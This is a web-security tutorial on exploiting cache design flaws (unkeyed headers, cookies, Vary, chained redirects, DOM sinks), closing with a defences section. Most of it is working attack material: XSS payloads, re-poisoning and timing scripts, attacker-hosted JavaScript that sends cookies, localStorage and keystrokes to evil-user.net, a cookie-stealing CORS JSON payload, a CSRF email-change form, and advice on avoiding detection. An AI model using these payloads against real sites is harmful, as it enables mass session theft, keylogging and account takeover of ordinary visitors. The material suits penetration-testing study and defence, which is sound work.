# Exploiting Cache Design Flaws

Cache design flaws represent the class of web cache poisoning vulnerability rooted not in implementation bugs but in structural decisions that were never secure to begin with — using unkeyed headers to generate content, trusting proxy-added fields to build resource URLs, and caching responses without considering that certain request components affect what the server returns but are deliberately excluded from the cache key. The result is a class of vulnerability where the attacker's one injected request poisons a cache entry that is then delivered verbatim to every subsequent visitor, transforming a reflected vector into mass-distributed stored exploitation with zero per-victim interaction required. Chaining multiple design flaws together often unlocks attack surfaces that would be individually inert, making this a domain where creativity and methodical reconnaissance compound each other's value.

**Fundamental principle: A cache design flaw exists whenever the back-end server uses a request component to generate its response but the cache is not configured to include that component in the cache key — the attacker who controls that excluded component controls what every user with a matching cache key receives.**

***

## Attack 1: XSS via Unkeyed Header Reflected in HTML

The simplest and most common design flaw: an unkeyed header value is reflected directly into cached HTML without sanitisation.

```http
# ── BASELINE: Understand the reflection ──────────────────────────────────────

# Normal request with X-Forwarded-Host (add cache buster first):
GET /en?region=uk&cb=TESTVALUE HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

# Response:
HTTP/1.1 200 OK
Cache-Control: public, max-age=30
X-Cache: miss

<html>
  <head>
    <meta property="og:image"
          content="https://innocent-website.co.uk/cms/social.png"/>
    #                          ↑ X-Forwarded-Host value reflected in content attribute
  </head>
</html>

# Note: Cache-Control: public → this response IS cacheable
# Note: X-Cache: miss → came from back-end, not cache


# ── CONFIRM UNKEYED ───────────────────────────────────────────────────────────

# Send without X-Forwarded-Host, same cache buster:
GET /en?region=uk&cb=TESTVALUE HTTP/1.1
Host: innocent-website.com
# (no X-Forwarded-Host)

# Response:
# X-Cache: hit
# <meta property="og:image" content="https://innocent-website.co.uk/cms/social.png"/>
#                                                 ↑ previous value still present
# → Response was cached with X-Forwarded-Host value in it
# → Served to subsequent requests WITHOUT the header
# → UNKEYED CONFIRMED ✓


# ── CRAFT AND DELIVER THE XSS PAYLOAD ────────────────────────────────────────

# The content attribute context requires breaking out of the attribute:
# content="https://[INJECTION]/cms/social.png"
# Injection: a."><script>alert(document.cookie)</script>
# Result:    content="https://a."><script>alert(document.cookie)</script>"/cms/social.png"
#
# The " closes the attribute, > closes the tag, then script executes.

# Step 1: Verify payload generates the desired response (with cache buster):
GET /en?region=uk&cb=ATTACKER1 HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(document.cookie)</script>

# Response:
HTTP/1.1 200 OK
Cache-Control: public
X-Cache: miss

<meta property="og:image"
      content="https://a."><script>alert(document.cookie)</script>"/cms/social.png"/>
#             ↑ XSS payload confirmed in response ✓

# Step 2: Poison the live cache — REMOVE the cache buster:
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(document.cookie)</script>

# Repeat until:
# X-Cache: hit  ← cache entry is now poisoned

# Step 3: Verify as a victim (no special headers, clean browser):
GET /en?region=uk HTTP/1.1
Host: innocent-website.com

# Response:
# X-Cache: hit
# <meta property="og:image" content="https://a."><script>alert(document.cookie)</script>".../>
# → XSS payload delivered to victim without their involvement ✓

# Step 4: Keep re-poisoning before TTL expires:
import requests, time

while True:
    requests.get(
        'https://innocent-website.com/en?region=uk',
        headers={'X-Forwarded-Host': 'a."><script>alert(document.cookie)</script>'}
    )
    time.sleep(25)    # re-poison 5 seconds before 30s TTL expires
```

***

## Attack 2: Malicious Resource Import via Unkeyed Header

When an unkeyed header controls the host used to import external JavaScript or CSS, the attacker can redirect that import to their own server hosting malicious code.

```http
# ── SCENARIO: X-Forwarded-Host controls <script src> domain ──────────────────

# Baseline (with cache buster):
GET /?cb=TEST1 HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net

# Response:
HTTP/1.1 200 OK
Cache-Control: public

<script src="https://evil-user.net/resources/js/analytics.js"></script>
#                    ↑ attacker-controlled domain in script src

# ── ATTACK EXECUTION ──────────────────────────────────────────────────────────

# Step 1: Host the payload on attacker's server
# File: https://evil-user.net/resources/js/analytics.js
# ──────────────────────────────────────────────────────
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://evil-user.net/collect', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(
    'cookie=' + encodeURIComponent(document.cookie) +
    '&url='    + encodeURIComponent(window.location.href) +
    '&storage='+ encodeURIComponent(JSON.stringify(window.localStorage))
);
# ──────────────────────────────────────────────────────

# Step 2: Poison the live cache:
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
# → Repeat until X-Cache: hit

# Every visitor to / now executes:
# → Evil analytics.js loads from attacker's server
# → All session cookies, localStorage, current URL exfiltrated
# → Runs silently — no visible UI change ✓

# ── IMPACT ESCALATION: Keylogger via poisoned JS ──────────────────────────────

# File: https://evil-user.net/resources/js/analytics.js
document.addEventListener('keydown', function(e) {
    var img = new Image();
    img.src = 'https://evil-user.net/log?k=' + encodeURIComponent(e.key) +
              '&f=' + encodeURIComponent(document.activeElement.name || '');
});
# → Every keystroke (passwords, 2FA codes, card numbers) exfiltrated in real time
```

***

## Attack 3: Unkeyed Cookie Reflected in Cached Response

Cookies are almost never part of the cache key, yet they frequently influence the content of cached responses.

```http
# ── SCENARIO: Language preference cookie controls page content ────────────────

# Normal request:
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
Cookie: language=pl

# Response:
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
X-Cache: miss
Content-Language: pl

[Polish version of the blog post]

# Cache key: /blog/post.php?mobile=1 (Host + path + query)
# Cookie is NOT in the cache key

# CONSEQUENCE WITHOUT MALICE: User with language=pl visits page first
# → Cached Polish response
# → All English-speaking users now receive Polish content until TTL expiry
# → This surfaces the bug to developers rapidly (self-reporting vulnerability)

# ── MALICIOUS EXPLOITATION: Inject XSS via cookie value ──────────────────────

# Check if cookie value is reflected without sanitisation:
GET /blog/post.php?mobile=1&cb=TEST HTTP/1.1
Host: innocent-website.com
Cookie: fehost=INJECTEDVALUE

# Response:
# <script>window.__INITIAL_DATA__ = {"fehost": "INJECTEDVALUE"};</script>
#                                               ↑ cookie value in JS object

# Craft XSS payload that breaks out of JS string context:
Cookie: fehost=someserver-PAYLOAD"-alert(document.cookie)-"

# Response:
# <script>window.__INITIAL_DATA__ = {"fehost": "someserver-PAYLOAD"-alert(document.cookie)-""};</script>
#                                                                   ↑ breaks string, executes JS

# Poison the live cache (remove cache buster):
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
Cookie: fehost=someserver-PAYLOAD"-alert(document.cookie)-"

# → Re-send until X-Cache: hit
# → All users who access /blog/post.php?mobile=1 receive XSS payload
# → No cookie header required in victim's request ✓


# ── VERIFYING UNKEYED COOKIE BEHAVIOUR ───────────────────────────────────────

# Technique: Send two requests with different cookie values, no cache buster.
# If the second request returns X-Cache: hit AND the response from the FIRST
# request (different cookie value) → the cookie is definitely unkeyed.

# Request 1:
GET /blog/post.php?mobile=1 HTTP/1.1
Cookie: language=en
# → X-Cache: miss, response: English content

# Request 2 (IMMEDIATELY after):
GET /blog/post.php?mobile=1 HTTP/1.1
Cookie: language=fr
# → X-Cache: HIT, response: English content  ← CACHE HIT despite different cookie!
# → language cookie is unkeyed → VULNERABLE ✓
```

***

## Attack 4: Multiple Unkeyed Headers Chained Together

Some vulnerabilities only become exploitable when two or more unkeyed headers are combined. Each header alone is either inert or has limited effect — but together they form a complete attack chain.

```http
# ── SCENARIO: X-Forwarded-Proto forces redirect; X-Forwarded-Host controls target ──

# Step 1: Discover X-Forwarded-Proto triggers a redirect response
GET /resources/js/tracking.js?cb=TEST HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http         ← website enforces HTTPS; http triggers redirect

# Response:
HTTP/1.1 301 Moved Permanently
Location: https://innocent-site.com/resources/js/tracking.js
# → 301 generated → but what controls the hostname in Location?

# Step 2: Add X-Forwarded-Host to control the redirect destination
GET /resources/js/tracking.js?cb=TEST2 HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http         ← triggers the redirect behaviour
X-Forwarded-Host: evil-user.net ← controls the host in the Location header

# Response:
HTTP/1.1 301 Moved Permanently
Location: https://evil-user.net/resources/js/tracking.js
#                  ↑ attacker's domain in redirect target ✓

# Step 3: Confirm both headers are unkeyed
# (verify 301 is served from cache without headers on second request)

# Step 4: Check if the 301 is cacheable
# Cache-Control: public → YES
# No Vary on X-Forwarded-Proto or X-Forwarded-Host → BOTH ARE UNKEYED ✓

# Step 5: Understand why this matters
# The page imports tracking.js as a <script> tag:
# <script src="/resources/js/tracking.js"></script>
#
# Browser fetches /resources/js/tracking.js
# Cache returns the 301 → redirects to https://evil-user.net/resources/js/tracking.js
# Browser follows redirect → loads attacker's JavaScript ✓

# Step 6: Host the malicious JS on attacker's server
# https://evil-user.net/resources/js/tracking.js
document.location = 'https://evil-user.net/phish?token=' + document.cookie;

# Step 7: Poison the live cache — remove cache buster, chain both headers:
GET /resources/js/tracking.js HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http
X-Forwarded-Host: evil-user.net

# → Repeat until X-Cache: hit on the 301 response

# Every user whose browser fetches /resources/js/tracking.js:
# → Gets 301 redirect to evil-user.net
# → evil-user.net's tracking.js executes
# → Cookie / credential theft ✓

# ── CHAINING VISUALISED ───────────────────────────────────────────────────────

#  User browser                Cache                  Back-end
#       │                         │                       │
#   GET /resources/js/tracking.js │                       │
#       ├────────────────────────►│                       │
#       │                   CACHE HIT (301)               │
#       │          (Location: https://evil-user.net/...)  │
#       │◄────────────────────────│                       │
#       │                         │                       │
#   (301) GET https://evil-user.net/resources/js/tracking.js
#       │ ←── goes to attacker's server, NOT the legit site
#       │
#  Attacker's JS executes ✓
```

***

## Attack 5: Exploiting Cache-Control Information Disclosure

Responses that reveal cache timing metadata allow attackers to minimise noise and time poisoning with surgical precision.

```http
# ── EXAMPLE: Response reveals cache age and TTL ───────────────────────────────

HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174                          ← entry has been cached for 174 seconds
Cache-Control: public, max-age=1800   ← total TTL = 1800 seconds (30 minutes)

# Remaining cache lifetime:
# 1800 - 174 = 1626 seconds = ~27 minutes until expiry

# ── NOISE-REDUCED ATTACK STRATEGY ────────────────────────────────────────────

# ✗ NAIVE approach: spam poisoning requests continuously
# → Generates hundreds of back-end requests
# → Spikes in access logs → detectable
# → WAF rate limiting may trigger

# ✓ SURGICAL approach: wait for TTL window, send ONE request
#
# Timeline:
#
#  [t=0]      Attacker observes Age: 174, max-age: 1800
#             Remaining TTL = 1626s
#
#  [t=1626s]  Cache entry expires → next user request will trigger back-end fetch
#
#  [t=1627s]  Attacker sends SINGLE poisoning request → response cached
#             (only one anomalous request in logs, may appear legitimate)
#
#  [t=1628s – t=3427s]  All users receive poisoned response
#
#  [t=3427s]  Attacker repeats the timing cycle

import requests, time

TARGET  = 'https://innocent-website.com/'
HEADERS = {'X-Forwarded-Host': 'evil-user.net'}

def get_cache_age():
    r = requests.get(TARGET)
    age = int(r.headers.get('Age', 0))
    max_age = 1800   # parse from Cache-Control if dynamic
    return age, max_age

age, max_age = get_cache_age()
remaining = max_age - age

print(f"[*] Cache expires in {remaining}s — waiting...")
time.sleep(remaining - 2)     # wake up 2s before expiry

# Send poisoning request at the exact moment the cache is about to expire:
resp = requests.get(TARGET, headers=HEADERS)
print(f"[+] Poisoning request sent — X-Cache: {resp.headers.get('X-Cache')}")

# If X-Cache: miss → response from back-end, our headers influenced it
# Wait one second and verify the poison was stored:
time.sleep(1)
verify = requests.get(TARGET)  # no malicious headers
print(f"[+] Verification — X-Cache: {verify.headers.get('X-Cache')}")
if 'evil-user.net' in verify.text:
    print("[!] Cache successfully poisoned ✓")
```

***

## Attack 6: Targeted Poisoning via the Vary Header

The `Vary` header instructs the cache to add specific request headers to the cache key. When used, it creates separate cache entries per header value — which an attacker can exploit to build a targeted attack against a specific user segment or individual.

```http
# ── SCENARIO: Vary: User-Agent restricts which users receive the poisoned response ──

# Observe the Vary header on a cached response:
HTTP/1.1 200 OK
Cache-Control: public
X-Cache: miss
Vary: User-Agent           ← User-Agent IS part of the cache key

# IMPLICATION 1: The poisoned cache entry only affects users with the SAME
# User-Agent as the attacker used when poisoning.

# IMPLICATION 2: The attacker can tailor the target:
#   a) Poison using the most common User-Agent → maximum user impact
#   b) Poison using the victim's known User-Agent → targeted single-user attack

# ── STEP 1: Discover the unknown header with Param Miner ─────────────────────
# The response also has an unkeyed header (found by Param Miner): X-Host
# X-Host is used to import resources; Vary tells us User-Agent is keyed.

# ── STEP 2: Identify the victim's User-Agent ──────────────────────────────────
# Technique: plant an HTML injection on a page the victim visits that causes
# their browser to make a cross-origin request including their User-Agent.

# If the attacker can post a comment on the target site:
<img src="https://attacker-server.net/log" />
# → Victim's browser fetches the image → attacker's server log shows User-Agent

# Or if there's a stored XSS in a non-cached endpoint:
<script>
fetch('https://attacker-server.net/ua?v=' + encodeURIComponent(navigator.userAgent));
</script>
# → Attacker receives: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...

# ── STEP 3: Poison the cache using victim's User-Agent ────────────────────────

# Replace your browser UA with the victim's captured UA:
GET / HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36   ← victim's UA
X-Host: evil-user.net         ← unkeyed header identified by Param Miner

# Response:
HTTP/1.1 200 OK
X-Cache: miss
Vary: User-Agent

<script src="https://evil-user.net/resources/js/app.js"></script>
# ↑ X-Host reflected in script src

# Re-send until X-Cache: hit → cache entry stored for THIS specific User-Agent

# ── STEP 4: Victim visits / ────────────────────────────────────────────────────
# Victim's browser sends request with matching User-Agent
# Cache key = / + Victim's UA → matches poisoned entry
# → Poisoned response served to victim only
# → evil-user.net/app.js executes
# → Attacker achieves targeted exploitation ✓

# ── IMPACT COMPARISON: Targeted vs. Broad attack ─────────────────────────────
#
# Without Vary:User-Agent
#   → ONE cache entry for / → ALL users receive poisoned response
#   → Massive blast radius → quickly detected
#
# With Vary:User-Agent
#   → Separate cache entry per UA
#   → Poison ONLY the victim's UA → only they are affected
#   → Stealthy: other users see normal responses → harder to detect
#   → Could evade detection by security team if they use a different UA
```

***

## Attack 7: DOM-Based Vulnerability Exploitation via Poisoned JSON

When a page fetches JSON from a URL that can be manipulated via an unkeyed header, and passes that JSON into an unsafe DOM sink, cache poisoning delivers a DOM XSS payload to every user sharing the cache key.

```javascript
// ── SCENARIO: Vulnerable client-side code that processes a remote JSON file ───

// Legitimate page source includes (in a <script> block):
data = {
    "host": "innocent-website.com",
    "path": "/"
};

// Separate JavaScript imports and uses the host from data:
// geolocate.js source (loaded on the page)
function initGeoLocate(jsonUrl) {
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');
            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            //                                  ↑ innerHTML = DOM XSS sink
            geoLocateContent.appendChild(div);
        });
}

initGeoLocate(`https://${data.host}/resources/json/geolocate.json`);
//                        ↑ if attacker controls data.host → controls URL

// CRITICAL: data.host comes from an inline <script> block in the HTML response.
// If that block is generated using an unkeyed header (X-Forwarded-Host),
// the attacker can redirect the fetch() to their own server.

// ── FULL ATTACK CHAIN ──────────────────────────────────────────────────────

// Step 1: Confirm X-Forwarded-Host is reflected in data.host
GET /?cb=TEST1 HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net

// Response:
// <script>
//   data = {
//     "host": "evil-user.net",    ← reflected ✓
//     "path": "/"
//   };
// </script>

// Step 2: Prepare malicious JSON on attacker's server
// File: https://evil-user.net/resources/json/geolocate.json
// ── IMPORTANT: Must include CORS header or SOP blocks the fetch ──────────────

HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *    ← grants any origin permission to read this JSON

{
    "country": "<img src=x onerror=fetch('https://evil-user.net/steal?c='+document.cookie)>"
}

// Why CORS is required here:
// ─────────────────────────────────────────────────────────────────
// The victim's browser fetches:
//   https://evil-user.net/resources/json/geolocate.json
// This is a cross-origin request (from innocent-website.com → evil-user.net)
// The browser enforces SOP on the response:
//   → Without Access-Control-Allow-Origin: * → fetch() throws CORS error
//   → With Access-Control-Allow-Origin: *    → response is readable ✓
// ─────────────────────────────────────────────────────────────────

// Step 3: Trace the full execution after cache is poisoned:
//
//  [Victim visits innocent-website.com/]
//       │
//       ↓ cache serves poisoned HTML
//  <script>data = {"host": "evil-user.net", "path": "/"};</script>
//       │
//       ↓ geolocate.js runs
//  fetch("https://evil-user.net/resources/json/geolocate.json")
//       │
//       ↓ CORS-enabled response from attacker's server
//  j = {"country": "<img src=x onerror=fetch('...?c='+document.cookie)>"}
//       │
//       ↓ innerHTML sink processes j.country
//  DOM: <img src=x onerror=fetch('https://evil-user.net/steal?c='+document.cookie)>
//       │
//       ↓ onerror fires (src=x fails)
//  Session cookie exfiltrated to evil-user.net ✓

// Step 4: Poison the live cache — remove cache buster
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
// Repeat until X-Cache: hit
```

***

## Attack 8: Chaining Multiple Vulnerabilities

Single design flaws are sometimes insufficient for a full attack. Chaining several unkeyed inputs — or combining cache poisoning with another vulnerability class — unlocks deeper exploitation.

```http
# ── CHAIN 1: Unkeyed cookie + unkeyed header + DOM sink ─────────────────────
#
# Vulnerability A: X-Forwarded-Scheme (unkeyed) → triggers HTTP→HTTPS redirect
# Vulnerability B: X-Forwarded-Host (unkeyed) → controls Location header value
# Vulnerability C: The redirect target imports a JS file susceptible to path manipulation
# Vulnerability D: Imported JS passes data to innerHTML (DOM XSS sink)
#
# Alone: each piece is either inert or limited.
# Together: full stored XSS delivered to all users.
#
# Step 1: X-Forwarded-Scheme=http triggers redirect (Vulnerability A)
GET /resources/js/tracking.js HTTP/1.1
X-Forwarded-Scheme: http
# → 301 redirect

# Step 2: Add X-Forwarded-Host to control redirect destination (Vulnerability B)
GET /resources/js/tracking.js HTTP/1.1
X-Forwarded-Scheme: http
X-Forwarded-Host: evil-user.net
# → 301 to https://evil-user.net/resources/js/tracking.js

# Step 3: Serve malicious tracking.js from evil-user.net (Vulnerability C+D):
# https://evil-user.net/resources/js/tracking.js
document.getElementById('cms-content').innerHTML = '<img src=x onerror=alert(document.cookie)>';

# Step 4: Poison the cache with the chained payload
# → /resources/js/tracking.js is now cached as a 301 to evil-user.net
# → Every page that imports tracking.js now loads the attacker's version
# → innerHTML sink executes XSS on all affected pages


# ── CHAIN 2: Cache poisoning → CSRF bypass ────────────────────────────────────
#
# Context: site uses anti-CSRF token in JavaScript, fetched on page load.
# Vulnerability: the JS file serving the token uses X-Forwarded-Host to determine
# where to POST the form data.
#
# Normal behaviour:
# <script src="/csrf-handler.js"></script>
# csrf-handler.js: var endpoint = "https://innocent-site.com/change-email";
#
# Poison the script import:
GET /csrf-handler.js HTTP/1.1
X-Forwarded-Host: evil-user.net
# → cache stores: <script src="https://evil-user.net/csrf-handler.js"></script>
#
# Attacker's csrf-handler.js:
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://innocent-site.com/change-email';
form.innerHTML = '<input name="email" value="attacker@evil.net">';
document.body.appendChild(form);
form.submit();
# → All users who load the page auto-submit a form changing their email to attacker ✓


# ── CHAIN 3: DOM clobbering + cache poisoning ─────────────────────────────────
#
# DOM clobbering: attacker's stored HTML creates a named anchor that overrides
# a JavaScript variable (document.getElementById('config').href used as a URL).
#
# Cache poisoning: used to serve the malicious response containing the clobbering
# payload to all users, not just those who view the attacker's stored content.
#
# Without cache poisoning:
#   → Stored content affects only users who view that specific page
#
# With cache poisoning:
#   → Attacker poisons the home page cache entry to include their clobbering payload
#   → All users who visit the home page are affected ✓
```

***

## Defences

```
Cache design flaw mitigation — by control layer:
─────────────────────────────────────────────────────────────────────────────

APPLICATION LAYER
────────────────────────────────────────────────────────────────────────────
✓ Never use request headers in the generation of cached responses.
  Use server-side config (SERVER_NAME, TRUSTED_PROXIES) for URL construction.

✓ Never use cookie values in responses that will be cached.
  For language preferences, serve language-specific cache keys (via Vary: Accept-Language)
  or build language into the URL (/en/, /pl/) rather than a cookie.

✓ Sanitise all output that could be influenced by any request component,
  whether that component appears to be unkeyed or not. Treat every header
  value, cookie, and query parameter as attacker-controlled.

✓ Use Content Security Policy (CSP) to limit the blast radius of injected scripts:
  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
  → Even if cache is poisoned with a foreign script src, CSP blocks execution

CACHE / CDN LAYER
────────────────────────────────────────────────────────────────────────────
✓ Disable unnecessary header support at the CDN level.
  If X-Forwarded-Host, X-Original-URL, or X-Forwarded-Server are not needed
  by the application, configure the CDN to strip them before forwarding.

✓ Key on headers the application actually uses.
  If the app uses X-Forwarded-Proto to generate redirect URLs, add it to the cache key.
  Discrepancy between "what generates the response" and "what is in the cache key"
  is the root cause of every design flaw in this category.

✓ Cache only genuinely static content.
  A resource that changes based on any request header is NOT static.
  Apply Cache-Control: no-store or Cache-Control: private to any response
  that varies based on unkeyed inputs.

✓ Review what cookies appear in cached responses.
  If any cookie value appears in a response body, either:
    a) Add that cookie to the cache key (using Vary: Cookie or CDN rules)
    b) Remove the cookie value from the cached response entirely

✓ Restrict caching to explicit allowlist of file extensions / paths:
  ✓ Cache: *.js, *.css, *.png, *.jpg, *.woff  (static assets — NO user-influenced content)
  ✗ Do not cache: /api/*, /account/*, /dashboard/*, dynamic HTML pages

OPERATIONAL LAYER
────────────────────────────────────────────────────────────────────────────
✓ Run Param Miner on all cacheable endpoints during every pentest engagement.
✓ Monitor for anomalous Cache-Control: public responses containing user data.
✓ Audit CDN configuration whenever new headers are added to the stack.
✓ Test with Burp Comparer: responses with and without suspect headers should be identical.
```
